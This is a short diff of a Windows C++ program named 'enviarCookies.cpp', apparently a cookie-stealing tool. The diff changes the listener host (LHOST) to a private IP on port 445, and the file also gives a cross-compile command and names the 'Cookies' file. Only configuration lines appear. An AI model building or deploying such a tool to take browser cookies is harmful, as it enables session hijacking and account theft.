@@ -8,7 +8,7 @@
        #include <lmcons.h>
        //Compilacion: i686-w64-mingw32-g++ enviarCookies.cpp -o envia -static-libgcc -static-libstdc++ -lwsock32
        #pragma comment(lib,"ws2_32.lib")
-       #define LHOST "10.10.1.13"
+       #define LHOST "192.168.114.129"
        #define LPORT 445
        #define BUFF 1000
        #define NOMARCH "Cookies"
